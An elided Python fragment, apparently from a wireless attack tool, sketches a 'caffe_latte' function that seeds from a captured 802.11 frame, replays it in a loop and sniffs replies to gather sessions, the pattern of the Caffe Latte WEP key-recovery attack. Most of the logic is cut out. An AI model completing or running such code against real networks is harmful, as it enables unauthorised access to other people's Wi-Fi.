...
def caffe_latte(
    ...
    if not captured:
        return None
    seed_frame = with_forced_rate(captured[0], mbps=2) if low_rate else captured[0].copy()
    if ibss:
        seed_frame[Dot11].flags = 0
    ...
    def _replay_loop():
        while not replay_done.is_set() and not stop.is_set():
    ...
    try:
        while not stop.is_set() and len(table.sessions) < target_sessions and time.monotonic() < deadline:
            ...
            sniff_fn(iface=iface, timeout=min(1.0, max(0.1, remaining)), prn=_on_reply, store=False)
            if progress_fn is not None:
